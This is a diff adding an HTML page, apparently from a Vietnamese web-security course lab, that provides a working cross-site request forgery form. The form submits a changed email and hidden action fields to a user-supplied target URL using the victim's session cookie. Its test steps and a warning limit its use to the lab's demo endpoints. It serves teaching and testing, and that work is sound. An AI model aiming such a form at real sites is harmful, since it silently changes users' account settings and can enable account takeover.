@@ -1,0 +1,49 @@
+<!doctype html>
+<html lang="vi">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>CSRF attacker form template</title>
+    <link rel="stylesheet" href="../../lab-theme.css">
+</head>
+
+<body id="lab-theme">
+    <h1>Attacker form template</h1>
+    <p>Đây là form HTML tối giản để kiểm thử lab. Mở file này trực tiếp hoặc host trên một origin khác với ứng dụng đích; tải trang từ cùng origin không mô phỏng cross-origin.</p>
+    <form id="attacker-form" method="post">
+        <label for="target">Target URL</label>
+        <input id="target" type="url" required placeholder="https://domain/25_26_BMUDW/07_CSRF/lab02/?cookie_mode=None">
+        <label for="email">Email attacker muốn đặt</label>
+        <input id="email" name="email" type="email" value="changed-by-cross-site@example.test" required>
+        <input type="hidden" name="cookie_mode" value="None">
+        <input type="hidden" name="action" value="update">
+        <button type="submit">Gửi cross-origin form POST</button>
+    </form>
+    <aside class="test-guide">
+        <h2>Hướng dẫn kiểm thử</h2>
+        <ol>
+            <li>Mở ứng dụng mục tiêu qua HTTPS và truy cập lab tương ứng trước để tạo session cookie.</li>
+            <li>Nhập URL đầy đủ tới endpoint đổi trạng thái: Lab 01/02 dùng URL thư mục; Lab 04 dùng URL thư mục và form sẽ gửi <code>action=vulnerable</code>.</li>
+            <li>Gửi form, sau đó quay lại application kiểm tra state. Không có JavaScript đọc response; form POST thường không cần CORS permission.</li>
+        </ol>
+        <p class="warning">Chỉ gửi tới endpoint demo trong bộ lab của bạn. Form này không truy cập hay thay đổi dữ liệu ở dịch vụ thật.</p>
+    </aside>
+    <script>
+        document.getElementById('attacker-form').addEventListener('submit', function (event) {
+            const target = document.getElementById('target').value;
+            try {
+                const parsedTarget = new URL(target);
+                if (parsedTarget.protocol !== 'http:' && parsedTarget.protocol !== 'https:') {
+                    throw new Error('Unsupported protocol');
+                }
+                this.action = parsedTarget.href;
+            } catch (error) {
+                event.preventDefault();
+                alert('Nhập một Target URL hợp lệ bắt đầu bằng http:// hoặc https://.');
+            }
+        });
+    </script>
+</body>
+
+</html>
